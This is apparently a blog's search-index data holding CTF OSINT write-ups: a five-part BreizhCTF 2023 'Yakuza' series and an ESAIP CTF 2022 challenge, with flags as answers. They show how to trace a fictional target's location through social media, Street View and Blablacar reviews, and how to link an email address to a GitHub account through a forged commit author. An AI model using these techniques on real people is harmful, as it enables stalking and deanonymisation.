Kamon Tomoe =\u003e store confirmation There are 2 in Japan (Osaka and Tokyo). Thanks to the photos on the LINE group, we know it‚Äôs in Osaka. Filter by most recent comment to obtain the flag. ","date":"2023-03-19","objectID":"/breizh-ctf-2023/:3:3","series":null,"tags":["OSINT","BreizhCTF","SOCMINT","GEOINT","irl"],"title":"[BreizhCTF 2023] - Yakuza Serie","uri":"/breizh-ctf-2023/#tldr-1"},{"categories":["Writeup"],"content":" GoalThe aim of this second challenge is now to link the target to the Yakuza group. Proof of membership must be obtained. ","date":"2023-03-19","objectID":"/breizh-ctf-2023/:3:4","series":null,"tags":["OSINT","BreizhCTF","SOCMINT","GEOINT","irl"],"title":"[BreizhCTF 2023] - Yakuza Serie","uri":"/breizh-ctf-2023/#goal-1"},{"categories":["Writeup"],"content":" MethodologyAs the statement for this second challenge underlines, there are two messages on the LINE group about a tattoo parlour and tattooing itself. In these, our target says she would have had a traditional tattoo in a store with a ‚ÄúKamon Tomoe ‚Äú sign. The tattoo in question: The first step is to research tattoo stores in Japan. A good place to start is with the best-known stores. We quickly, if not immediately, come across ‚ÄúTokyo Three Tides‚Äù. Researching this sign, we come across the store‚Äôs logo: The logo turns out to be a kind of Kamon Tomoe, telling us we‚Äôre on the right track. Considering that the target had a tattoo there, he potentially left a review or photo. It remains to be seen which of the two stores in Tokyo or Osaka is the right one. With a slight correlation of information and a little GEOINT on the photos present on LINE or Twitter, we can deduce that he is very often in Osaka. Here‚Äôs an example: Let‚Äôs talk a look at the reviews of Tokyo Three Tides Osaka. Sorting by most recent photo, we come across a comment by Hijikata Takeshi. It also contains an image on which the flag is written. ","date":"2023-03-19","objectID":"/breizh-ctf-2023/:3:5","series":null,"tags":["OSINT","BreizhCTF","SOCMINT","GEOINT","irl"],"title":"[BreizhCTF 2023] - Yakuza Serie","uri":"/breizh-ctf-2023/#methodology-1"},{"categories":["Writeup"],"content":" FlagBZHCTF{t4tt00s_4r3_p4rt_0f_th3_tr4d1t10n} ","date":"2023-03-19","objectID":"/breizh-ctf-2023/:3:6","series":null,"tags":["OSINT","BreizhCTF","SOCMINT","GEOINT","irl"],"title":"[BreizhCTF 2023] - Yakuza Serie","uri":"/breizh-ctf-2023/#flag-1"},{"categories":["Writeup"],"content":" Yakuza (3/5) - Onigiri","date":"2023-03-19","objectID":"/breizh-ctf-2023/:4:0","series":null,"tags":["OSINT","BreizhCTF","SOCMINT","GEOINT","irl"],"title":"[BreizhCTF 2023] - Yakuza Serie","uri":"/breizh-ctf-2023/#yakuza-35---onigiri"},{"categories":["Writeup"],"content":" Challenge description Here's my proof! Tattoos are a yakuza tradition. In fact, he claims loud and clear that he belongs to this group and that it was an obligation. Anyway, now that I've got that, I'll have to work on locating it. I think I'll be a while, it's never easy. Where should I start? I need to keep a cool head and pull together what I've already got on him. Maybe I could go back to his LINE group or his Twitter account and look for information? He's bound to have mentioned meeting someone. That would be a good pivot point. Maybe that person will give me more information. ","date":"2023-03-19","objectID":"/breizh-ctf-2023/:4:1","series":null,"tags":["OSINT","BreizhCTF","SOCMINT","GEOINT","irl"],"title":"[BreizhCTF 2023] - Yakuza Serie","uri":"/breizh-ctf-2023/#challenge-description-2"},{"categories":["Writeup"],"content":" Challenge details Event Serie Challenge Category Points Solves BreizhCTF 2023 Yakuza Onigiri (3/5) OSINT ??? ??? ","date":"2023-03-19","objectID":"/breizh-ctf-2023/:4:2","series":null,"tags":["OSINT","BreizhCTF","SOCMINT","GEOINT","irl"],"title":"[BreizhCTF 2023] - Yakuza Serie","uri":"/breizh-ctf-2023/#challenge-details-2"},{"categories":["Writeup"],"content":" TL;DR Use Shazam (or other) to recognize the song and artist =\u003e Onigiri by Tonikaku Jay. The artist has an Instagram (@tonikakujay) on which he doesn‚Äôt seem very active. Looking at his followers, we notice his personal account (@jaylaalynvicks) Pivot to his second Instagram account on which he is VERY active. In story, he talks about his friend, also known as Hijikata Takeshi who happens to be our target =\u003e presence of a flag in last story. [BACKUP] Another way is to browse through his front-page stories. The one with the name ‚Äúüö©‚Äù also contains the flag. ","date":"2023-03-19","objectID":"/breizh-ctf-2023/:4:3","series":null,"tags":["OSINT","BreizhCTF","SOCMINT","GEOINT","irl"],"title":"[BreizhCTF 2023] - Yakuza Serie","uri":"/breizh-ctf-2023/#tldr-2"},{"categories":["Writeup"],"content":" ObjectifThe aim of this third challenge is to find the individual. In this 3-stage hunt, the first step is to look at the target‚Äôs entourage to see if he appears on the posts or stories of potential friends of his. In this case, yes, in the story of a good rapper friend of his‚Ä¶ ","date":"2023-03-19","objectID":"/breizh-ctf-2023/:4:4","series":null,"tags":["OSINT","BreizhCTF","SOCMINT","GEOINT","irl"],"title":"[BreizhCTF 2023] - Yakuza Serie","uri":"/breizh-ctf-2023/#objectif"},{"categories":["Writeup"],"content":" M√©thodologieOn the LINE group, we notice that the target has posted a video: It contains a telephone recording of an obviously Japanese-American song. The video features two emoticons, one of which represents an onigiri (hint hint). What‚Äôs more, it seems from the description and comments that this is the music of a good friend of his. Using Shazam to find the music, we come across ‚ÄúOnigiri ‚Äú by artist Tonikaku Jay. So this is the person who would be part of our target‚Äôs entourage. With a few simple searches, we quickly came across the rapper‚Äôs social networks, including his instagram. However, he‚Äôs not very active there. He‚Äôs certainly more active on his personal account, as our target on the LINE group shows. ‚ÄúWhat I always find strange about him is that he‚Äôs always much more active on his secondary account‚Ä¶‚Äù Searching his followers and filtering with ‚ÄúJay‚Äù (deduced from Tonikaku Jay meaning ‚Äúanyway, Jay‚Äù), we come across the account @jaylaalynvicks which happens to be his main account. We notice that the account has a story. In one of them, he talks about his friend and gives us the flag to validate the third stage of the challenge. ","date":"2023-03-19","objectID":"/breizh-ctf-2023/:4:5","series":null,"tags":["OSINT","BreizhCTF","SOCMINT","GEOINT","irl"],"title":"[BreizhCTF 2023] - Yakuza Serie","uri":"/breizh-ctf-2023/#m√©thodologie"},{"categories":["Writeup"],"content":" FlagBZHCTF{g0_l1st3n_t0_t0n1k4ku_j4y!} ","date":"2023-03-19","objectID":"/breizh-ctf-2023/:4:6","series":null,"tags":["OSINT","BreizhCTF","SOCMINT","GEOINT","irl"],"title":"[BreizhCTF 2023] - Yakuza Serie","uri":"/breizh-ctf-2023/#flag-2"},{"categories":["Writeup"],"content":" Yakuza (4/5) - IS THAT A SUPRA ???","date":"2023-03-19","objectID":"/breizh-ctf-2023/:5:0","series":null,"tags":["OSINT","BreizhCTF","SOCMINT","GEOINT","irl"],"title":"[BreizhCTF 2023] - Yakuza Serie","uri":"/breizh-ctf-2023/#yakuza-45---is-that-a-supra-"},{"categories":["Writeup"],"content":" Challenge description Yes, more proof! I managed to make the connection between our suspect and a rapper friend of his. According to him, he's on his way to a new destination to meet up with an \"acquaintance\". I'm lucky that he's quite talkative about his group of friends, he's obviously just left me a new clue. With those already present, I should be able to find out his final destination. ","date":"2023-03-19","objectID":"/breizh-ctf-2023/:5:1","series":null,"tags":["OSINT","BreizhCTF","SOCMINT","GEOINT","irl"],"title":"[BreizhCTF 2023] - Yakuza Serie","uri":"/breizh-ctf-2023/#challenge-description-3"},{"categories":["Writeup"],"content":" D√©tails du challenge Event Serie Challenge Category Points Solves BreizhCTF 2023 Yakuza IS THAT A SUPRA ??? (4/5) OSINT N/C N/C ","date":"2023-03-19","objectID":"/breizh-ctf-2023/:5:2","series":null,"tags":["OSINT","BreizhCTF","SOCMINT","GEOINT","irl"],"title":"[BreizhCTF 2023] - Yakuza Serie","uri":"/breizh-ctf-2023/#d√©tails-du-challenge"},{"categories":["Writeup"],"content":" TL;DR GEOINT to find your destination: Couvent des Jacobins in Rennes from Rennes train station. Thanks to the screenshot of his wallpaper, we can see that he has the Blablacar application. Several posts indicate his return date and the fact that it‚Äôs a round trip with the same driver. On the Blablacar app: search for a trip on Saturday March 18 (end of BreizhCTF) at 08:00 from Couvent to Rennes train station. Ewen posts the trip =\u003e a review =\u003e Hijikata‚Äôs profile =\u003e review =\u003e flag ","date":"2023-03-19","objectID":"/breizh-ctf-2023/:5:3","series":null,"tags":["OSINT","BreizhCTF","SOCMINT","GEOINT","irl"],"title":"[BreizhCTF 2023] - Yakuza Serie","uri":"/breizh-ctf-2023/#tldr-3"},{"categories":["Writeup"],"content":" GoalThe aim of this fourth challenge remains the same: to locate our target. This time, it‚Äôs possible to pinpoint the target‚Äôs exact location and final destination. ","date":"2023-03-19","objectID":"/breizh-ctf-2023/:5:4","series":null,"tags":["OSINT","BreizhCTF","SOCMINT","GEOINT","irl"],"title":"[BreizhCTF 2023] - Yakuza Serie","uri":"/breizh-ctf-2023/#goal-2"},{"categories":["Writeup"],"content":" MethodologyThis difficult challenge can be broken down into two parts: on the one hand with GEOINT work. On the other, SOCMINT. 1. GEOINT PartFor this first part, we begin by analyzing Hijikata‚Äôs post containing a photo that appears to be the front of a religious building. We also note the presence of a banner on the wall. The description reads (roughly translated): Do you know where the small photo of the destination is? The event is just around the corner. He challenges his friends to find the location, knowing that the event he‚Äôs going to is right next door. By analyzing the photo despite its quality, we can easily extract the following text: Marcel Callo 1921 2021 A Google search of the text yields initial results indicating that the event took place in Rennes, and would be related to the diocese of that city. A closer look at this event reveals that most of it took place at the Basilica of Saint-Aubin. The next logical step is to search for this basilica on Google Maps to find out what it looks like and confirm or deny whether the photo matches. With the right placement on Street View, you‚Äôll immediately notice the identical storefront. The banner still hangs there. This confirms that the event is taking place right next to this basilica, at ‚ÄòPlace Saint-Anne‚Äô. If you haven‚Äôt yet made the connection with your current location (wink wink), an interesting search might be place saint anne events rennes The results quickly bring up Couvent des Jacobins in Rennes. As a final check, we can measure the distance between the two points to see if they are right next to each other. This concludes the GEOINT section. The target goes to the Couvent des Jacobins and will be present at the BreizhCTF. 2. SOCMINT PartNow that we know where the target is going, we can use this information. Here, the interesting information is the post in which he talks about his new car. He shows his wallpaper and we get a glimpse of some of the applications he uses. These include Blablacar. It‚Äôs an application for carpooling in Europe. Do you like my wallpaper? I bought a new car In addition, two other posts give us further information about his whereabouts. Firstly, one in which he says he can‚Äôt wait to see how they drive (implying foreigners) but also that he‚Äôll be making a round trip from the venue to the station. As a car enthusiast, I can't wait to see how they drive. But it's going to be a short trip... It will be a round trip from the venue to the station On the other hand, he mentions in the second that he‚Äôll be going home at the end of the event on Saturday morning. `In fact, I‚Äôll be going home as soon as the event is over. That will be Saturday morning. Also, as a comment, he says it will be with the same driver. With the same driver With all our information, we can now carry out a search on Blablacar. The most important thing is to search for the return journey, since the outward journey is no longer available. The search in question : From: Le Couvent des Jacobins - Centre des Congr√®s de Rennes M√©tropole, Rennes to: Rennes train station. To: Gare de Rennes, Rennes (Rennes train station) Date: Saturday March 18 (end of BreizhCTF) We come across the route of a certain Ewen. On the route in question, we can obtain information about the driver. You‚Äôll notice that he has a review. This review was left by Hijikata. This is a pivotal point for navigating to your Blablacar account. Repeating the same procedure and going to Hijikata‚Äôs reviews, we finally find the flag. ","date":"2023-03-19","objectID":"/breizh-ctf-2023/:5:5","series":null,"tags":["OSINT","BreizhCTF","SOCMINT","GEOINT","irl"],"title":"[BreizhCTF 2023] - Yakuza Serie","uri":"/breizh-ctf-2023/#methodology-2"},{"categories":["Writeup"],"content":" MethodologyThis difficult challenge can be broken down into two parts: on the one hand with GEOINT work. On the other, SOCMINT. 1. GEOINT PartFor this first part, we begin by analyzing Hijikata‚Äôs post containing a photo that appears to be the front of a religious building. We also note the presence of a banner on the wall. The description reads (roughly translated): Do you know where the small photo of the destination is? The event is just around the corner. He challenges his friends to find the location, knowing that the event he‚Äôs going to is right next door. By analyzing the photo despite its quality, we can easily extract the following text: Marcel Callo 1921 2021 A Google search of the text yields initial results indicating that the event took place in Rennes, and would be related to the diocese of that city. A closer look at this event reveals that most of it took place at the Basilica of Saint-Aubin. The next logical step is to search for this basilica on Google Maps to find out what it looks like and confirm or deny whether the photo matches. With the right placement on Street View, you‚Äôll immediately notice the identical storefront. The banner still hangs there. This confirms that the event is taking place right next to this basilica, at ‚ÄòPlace Saint-Anne‚Äô. If you haven‚Äôt yet made the connection with your current location (wink wink), an interesting search might be place saint anne events rennes The results quickly bring up Couvent des Jacobins in Rennes. As a final check, we can measure the distance between the two points to see if they are right next to each other. This concludes the GEOINT section. The target goes to the Couvent des Jacobins and will be present at the BreizhCTF. 2. SOCMINT PartNow that we know where the target is going, we can use this information. Here, the interesting information is the post in which he talks about his new car. He shows his wallpaper and we get a glimpse of some of the applications he uses. These include Blablacar. It‚Äôs an application for carpooling in Europe. Do you like my wallpaper? I bought a new car In addition, two other posts give us further information about his whereabouts. Firstly, one in which he says he can‚Äôt wait to see how they drive (implying foreigners) but also that he‚Äôll be making a round trip from the venue to the station. As a car enthusiast, I can't wait to see how they drive. But it's going to be a short trip... It will be a round trip from the venue to the station On the other hand, he mentions in the second that he‚Äôll be going home at the end of the event on Saturday morning. `In fact, I‚Äôll be going home as soon as the event is over. That will be Saturday morning. Also, as a comment, he says it will be with the same driver. With the same driver With all our information, we can now carry out a search on Blablacar. The most important thing is to search for the return journey, since the outward journey is no longer available. The search in question : From: Le Couvent des Jacobins - Centre des Congr√®s de Rennes M√©tropole, Rennes to: Rennes train station. To: Gare de Rennes, Rennes (Rennes train station) Date: Saturday March 18 (end of BreizhCTF) We come across the route of a certain Ewen. On the route in question, we can obtain information about the driver. You‚Äôll notice that he has a review. This review was left by Hijikata. This is a pivotal point for navigating to your Blablacar account. Repeating the same procedure and going to Hijikata‚Äôs reviews, we finally find the flag. ","date":"2023-03-19","objectID":"/breizh-ctf-2023/:5:5","series":null,"tags":["OSINT","BreizhCTF","SOCMINT","GEOINT","irl"],"title":"[BreizhCTF 2023] - Yakuza Serie","uri":"/breizh-ctf-2023/#1-geoint-part"},{"categories":["Writeup"],"content":" MethodologyThis difficult challenge can be broken down into two parts: on the one hand with GEOINT work. On the other, SOCMINT. 1. GEOINT PartFor this first part, we begin by analyzing Hijikata‚Äôs post containing a photo that appears to be the front of a religious building. We also note the presence of a banner on the wall. The description reads (roughly translated): Do you know where the small photo of the destination is? The event is just around the corner. He challenges his friends to find the location, knowing that the event he‚Äôs going to is right next door. By analyzing the photo despite its quality, we can easily extract the following text: Marcel Callo 1921 2021 A Google search of the text yields initial results indicating that the event took place in Rennes, and would be related to the diocese of that city. A closer look at this event reveals that most of it took place at the Basilica of Saint-Aubin. The next logical step is to search for this basilica on Google Maps to find out what it looks like and confirm or deny whether the photo matches. With the right placement on Street View, you‚Äôll immediately notice the identical storefront. The banner still hangs there. This confirms that the event is taking place right next to this basilica, at ‚ÄòPlace Saint-Anne‚Äô. If you haven‚Äôt yet made the connection with your current location (wink wink), an interesting search might be place saint anne events rennes The results quickly bring up Couvent des Jacobins in Rennes. As a final check, we can measure the distance between the two points to see if they are right next to each other. This concludes the GEOINT section. The target goes to the Couvent des Jacobins and will be present at the BreizhCTF. 2. SOCMINT PartNow that we know where the target is going, we can use this information. Here, the interesting information is the post in which he talks about his new car. He shows his wallpaper and we get a glimpse of some of the applications he uses. These include Blablacar. It‚Äôs an application for carpooling in Europe. Do you like my wallpaper? I bought a new car In addition, two other posts give us further information about his whereabouts. Firstly, one in which he says he can‚Äôt wait to see how they drive (implying foreigners) but also that he‚Äôll be making a round trip from the venue to the station. As a car enthusiast, I can't wait to see how they drive. But it's going to be a short trip... It will be a round trip from the venue to the station On the other hand, he mentions in the second that he‚Äôll be going home at the end of the event on Saturday morning. `In fact, I‚Äôll be going home as soon as the event is over. That will be Saturday morning. Also, as a comment, he says it will be with the same driver. With the same driver With all our information, we can now carry out a search on Blablacar. The most important thing is to search for the return journey, since the outward journey is no longer available. The search in question : From: Le Couvent des Jacobins - Centre des Congr√®s de Rennes M√©tropole, Rennes to: Rennes train station. To: Gare de Rennes, Rennes (Rennes train station) Date: Saturday March 18 (end of BreizhCTF) We come across the route of a certain Ewen. On the route in question, we can obtain information about the driver. You‚Äôll notice that he has a review. This review was left by Hijikata. This is a pivotal point for navigating to your Blablacar account. Repeating the same procedure and going to Hijikata‚Äôs reviews, we finally find the flag. ","date":"2023-03-19","objectID":"/breizh-ctf-2023/:5:5","series":null,"tags":["OSINT","BreizhCTF","SOCMINT","GEOINT","irl"],"title":"[BreizhCTF 2023] - Yakuza Serie","uri":"/breizh-ctf-2023/#2-socmint-part"},{"categories":["Writeup"],"content":" FlagBZHCTF{w3ll_n0t_4_supr4_just_4_c4rp00l1ng} ","date":"2023-03-19","objectID":"/breizh-ctf-2023/:5:6","series":null,"tags":["OSINT","BreizhCTF","SOCMINT","GEOINT","irl"],"title":"[BreizhCTF 2023] - Yakuza Serie","uri":"/breizh-ctf-2023/#flag-3"},{"categories":["Writeup"],"content":" Yakuza (5/5) - D√©tective Conan","date":"2023-03-19","objectID":"/breizh-ctf-2023/:6:0","series":null,"tags":["OSINT","BreizhCTF","SOCMINT","GEOINT","irl"],"title":"[BreizhCTF 2023] - Yakuza Serie","uri":"/breizh-ctf-2023/#yakuza-55---d√©tective-conan"},{"categories":["Writeup"],"content":" Challenge description What a coincidence! Our suspect happened to be on his way to Rennes. According to his messages, he was meeting another member of his group who was also taking part in the BreizhCTF! According to CCTV footage, he disposed of two phones in two baskets when he arrived at the Couvent des Jacobins. I'm sure there must be some clues on them... ","date":"2023-03-19","objectID":"/breizh-ctf-2023/:6:1","series":null,"tags":["OSINT","BreizhCTF","SOCMINT","GEOINT","irl"],"title":"[BreizhCTF 2023] - Yakuza Serie","uri":"/breizh-ctf-2023/#challenge-description-4"},{"categories":["Writeup"],"content":" Challenge details Event Serie Challenge Category Points Solves BreizhCTF 2023 Yakuza D√©tective Conan (5/5) OSINT N/C N/C ","date":"2023-03-19","objectID":"/breizh-ctf-2023/:6:2","series":null,"tags":["OSINT","BreizhCTF","SOCMINT","GEOINT","irl"],"title":"[BreizhCTF 2023] - Yakuza Serie","uri":"/breizh-ctf-2023/#challenge-details-3"},{"categories":["Writeup"],"content":" TL;DR Find the location of the two baskets There is a telephone in each of the garbage cans. On phone n¬∞1 =\u003e inbox =\u003e conversation containing the first part of the flag On phone n¬∞2 =\u003e files =\u003e photo containing the second part of the flag ","date":"2023-03-19","objectID":"/breizh-ctf-2023/:6:3","series":null,"tags":["OSINT","BreizhCTF","SOCMINT","GEOINT","irl"],"title":"[BreizhCTF 2023] - Yakuza Serie","uri":"/breizh-ctf-2023/#tldr-4"},{"categories":["Writeup"],"content":" GoalThe aim of this latest challenge is to find the phones belonging to the attacker. ","date":"2023-03-19","objectID":"/breizh-ctf-2023/:6:4","series":null,"tags":["OSINT","BreizhCTF","SOCMINT","GEOINT","irl"],"title":"[BreizhCTF 2023] - Yakuza Serie","uri":"/breizh-ctf-2023/#goal-3"},{"categories":["Writeup"],"content":" MethodologyThe first step is to find the location for the two baskets. No special technique is required. Just move around and look for them in the Jacobins Convent. Here are the locations of the two baskets: Etage 0 : Etage 2 : Each contains a telephone. Browsing through phone n¬∞1, we find several pieces of evidence, including a conversation with a certain ‚ÄúGCC‚Äù. This first conversation contains the first part of the flag. BZHCTF{I_h0p3_y0u_l1k3d_ Rummaging around on phone no. 2, we find a photo in the phone‚Äôs files containing the second part of the flag. th3_y4kuz4_4dv3ntur3} This final challenge brings the ‚ÄúYakuza‚Äù series to a close. I‚Äôd love to hear your feedback on this challenge series, whether positive or negative. So don‚Äôt hesitate to contact me on Discord or Twitter. (: ","date":"2023-03-19","objectID":"/breizh-ctf-2023/:6:5","series":null,"tags":["OSINT","BreizhCTF","SOCMINT","GEOINT","irl"],"title":"[BreizhCTF 2023] - Yakuza Serie","uri":"/breizh-ctf-2023/#methodology-3"},{"categories":["Writeup"],"content":" FlagBZHCTF{I_h0p3_y0u_l1k3d_th3_y4kuz4_4dv3ntur3} ","date":"2023-03-19","objectID":"/breizh-ctf-2023/:6:6","series":null,"tags":["OSINT","BreizhCTF","SOCMINT","GEOINT","irl"],"title":"[BreizhCTF 2023] - Yakuza Serie","uri":"/breizh-ctf-2023/#flag-4"},{"categories":["Writeup"],"content":" ConclusionI hope you enjoyed this series of challenges. This was my first time on the makers‚Äô side. As such, I‚Äôm sure there‚Äôs still a lot of room for improvement to make these challenges perfect. However, I hope to have taken you on a journey, as I did this summer on my trip to Japan. These challenges are closely linked to my trip (tattooing, meeting the rapper, the HIPPO caf√©‚Ä¶). So I‚Äôd love to hear your feedback on this series of challenges, whether positive or negative. What you liked or didn‚Äôt like. Don‚Äôt hesitate to contact me on Discord or Twitter. (: „ÅÑ„Å£„Å¶„Çâ„Å£„Åó„ÇÉ„ÅÑ üëã ! (^^) ","date":"2023-03-19","objectID":"/breizh-ctf-2023/:7:0","series":null,"tags":["OSINT","BreizhCTF","SOCMINT","GEOINT","irl"],"title":"[BreizhCTF 2023] - Yakuza Serie","uri":"/breizh-ctf-2023/#conclusion"},{"categories":["Writeup"],"content":"Solution of the challenge 'The Proof of the Malware' made by Hippie at ESAIP 2022.","date":"2022-11-21","objectID":"/esaip-ctf-2022/","series":null,"tags":["OSINT","ESAIP CTF","SOCMINT"],"title":"[ESAIP CTF 2022] - The Proof of the Malware","uri":"/esaip-ctf-2022/"},{"categories":["Writeup"],"content":"Here is the writeup of The Proof of the Malware, a cool OSINT challenge categorized as medium during the ESAIP CTF. After some time without anybody solving the challenge I managed to first blood itü©∏. ","date":"2022-11-21","objectID":"/esaip-ctf-2022/:0:0","series":null,"tags":["OSINT","ESAIP CTF","SOCMINT"],"title":"[ESAIP CTF 2022] - The Proof of the Malware","uri":"/esaip-ctf-2022/#"},{"categories":["Writeup"],"content":" Instructions We have discovered that a person currently working at Metacortexxs is developing a powerful virus. Find the proof of the development of this virus by this employee ","date":"2022-11-21","objectID":"/esaip-ctf-2022/:1:0","series":null,"tags":["OSINT","ESAIP CTF","SOCMINT"],"title":"[ESAIP CTF 2022] - The Proof of the Malware","uri":"/esaip-ctf-2022/#instructions"},{"categories":["Writeup"],"content":" Information Gathering - Finding the targetAccording to the instructions, we are searching for someone who is working at Metacortexxs. The first idea that came into my mind is to do some research on LinkedIn. To do this, I used a simple Google dork : site:linkedin.com \"megacortexxs\" The first result seemed interesting. Apparently, there is a certain Noe Trimax working at Metacortexxs as Informatics Specialist. Interesting üëÄ. So I went on his profile to find some more informations. As you can see, I saw there was some additionnal contact informations on his profile. In order to see this, you have to be logged in on a LinkedIn account. Otherwise you‚Äôll miss it ! The investigation proceeds with the finding of his email. n3oth3h4xx0r@protonmail.com ","date":"2022-11-21","objectID":"/esaip-ctf-2022/:2:0","series":null,"tags":["OSINT","ESAIP CTF","SOCMINT"],"title":"[ESAIP CTF 2022] - The Proof of the Malware","uri":"/esaip-ctf-2022/#information-gathering---finding-the-target"},{"categories":["Writeup"],"content":" Pivoting - Let‚Äôs find the malwareI can now pivot on EPIOS. For those who doesn‚Äôt know the tool, it is an OSINT search engine that allows performing reverse email search. Using it, I am able to retrieve information linked to an email address without notifying the user. Thanks to Holehe, we can see that Noe‚Äôs email is used on two different websites : Github and Twitter. Since we have to find the proof of the development of a virus, the github seems to be the most interesting place. But let‚Äôs see if I can find something interesting on his Twitter account (like a link to his github profile for example). ","date":"2022-11-21","objectID":"/esaip-ctf-2022/:3:0","series":null,"tags":["OSINT","ESAIP CTF","SOCMINT"],"title":"[ESAIP CTF 2022] - The Proof of the Malware","uri":"/esaip-ctf-2022/#pivoting---lets-find-the-malware"},{"categories":["Writeup"],"content":" Twitter - A (white) rabbit holeIn order to find his Twitter account, I just typed his username : n3oth3h4xx0r Sadly, there‚Äôs nothing interesting on his profile. But I liked his bio. (: ","date":"2022-11-21","objectID":"/esaip-ctf-2022/:3:1","series":null,"tags":["OSINT","ESAIP CTF","SOCMINT"],"title":"[ESAIP CTF 2022] - The Proof of the Malware","uri":"/esaip-ctf-2022/#twitter---a-white-rabbit-hole"},{"categories":["Writeup"],"content":" Github - Not stealthy enough, No√©Here‚Äôs the tricky part of the challenge. I had to use a technique that is not very well known in order to find his github profile. Because yes, it is actually possible to find a Github username only with the associated email. To do so, I needed to make a commit on a personal repository with the flag --author. The value of this flag must respect the following format : --author=\"Name \u003cemail@domain.tld\u003e\". In this case, I ran the following commands : git commit --author=\"Test \u003cn3oth3h4xx0r@protonmail.com\u003e\" -m \"test\" git push origin main Then, I went on Github in order to find out Noe‚Äôs account : Hmm, so he is the so-called Und3rc0ver-h4xx0r-fr0m-the-m4tr1x. The cover is burnt No√©. By going on his profile, I can see there‚Äôs an interesting repo : The repo called Backdoor-python-polymorph is very suspicious, right ? Let‚Äôs see what‚Äôs in there. It looks like we‚Äôve found our virus development proof here. I was quite chocked when I found out that Linus Torvald was involved though üò¢ ! ","date":"2022-11-21","objectID":"/esaip-ctf-2022/:3:2","series":null,"tags":["OSINT","ESAIP CTF","SOCMINT"],"title":"[ESAIP CTF 2022] - The Proof of the Malware","uri":"/esaip-ctf-2022/#github---not-stealthy-enough-no√©"},{"categories":["Writeup"],"content":" Finding the flag - CommitsNow we have to find the flag. Let‚Äôs see the commits : We can see there‚Äôs plenty of them. After some manual inspection, the added bin and header one contains what I was looking for : the flag. Flag : ECTF{N07_7H47_C13V3r_70_137_1NF0rM4710N5_A80U7_Y0Ur531F} Thanks to the author Hippie for this challenge. It was very entertaining and it was a great opportunity to put some light on this secret github technique. ","date":"2022-11-21","objectID":"/esaip-ctf-2022/:4:0","series":null,"tags":["OSINT","ESAIP CTF","SOCMINT"],"title":"[ESAIP CTF 2022] - The Proof of the Malware","uri":"/esaip-ctf-2022/#finding-the-flag---commits"},{"categories":["Article"],"content":" Hello world !Well, this is the first post of the blog. I‚Äôll just describe what you‚Äôll find on here. ","date":"2022-11-20","objectID":"/hello-world/:1:0","series":null,"tags":["Introduction"],"title":"Hello World","uri":"/hello-world/#hello-world-"},{"categories":["Article"],"content":" Blog postsI‚Äôm not really sure what this section will contain yet. It will probably be news analysis, feedbacks on security topics and certifications (Offensive Security, Zero2Automated‚Ä¶) and various technical posts about infosec. ","date":"2022-11-20","objectID":"/hello-world/:1:1","series":null,"tags":["Introduction"],"title":"Hello World","uri":"/hello-world/#blog-posts"},{"categories":["Article"],"content":" ProjetcsIn this section, you‚Äôll find the projects that I‚Äôve been working on during my scholarship and my free time. ","date":"2022-11-20","objectID":"/hello-world/:1:2","series":null,"tags":["Introduction"],"title":"Hello World","uri":"/hello-world/#projetcs"},{"categories":["Article"],"content":" WriteupsAs a member of the MILF CTF Team, I often participate in CTF (Capture The Flag) competitions. If I find a particularly interesting challenge and if I‚Äôm not lazy to do it, I sometimes post writeups here and there. The goal is to show the way I managed to solve the challenge. ","date":"2022-11-20","objectID":"/hello-world/:1:3","series":null,"tags":["Introduction"],"title":"Hello World","uri":"/hello-world/#writeups"},{"categories":["Article"],"content":" MusicAs a huge music listener, I love to make playlists. This is the place where you‚Äôll find what I like to listen to during CTF competiton or while working. You‚Äôll also find official CTF playlists. ","date":"2022-11-20","objectID":"/hello-world/:1:4","series":null,"tags":["Introduction"],"title":"Hello World","uri":"/hello-world/#music"},{"categories":["Article"],"content":" CreditsThis website is running thanks to : Hugo The DoIt theme ","date":"2022-11-20","objectID":"/hello-world/:2:0","series":null,"tags":["Introduction"],"title":"Hello World","uri":"/hello-world/#credits"}]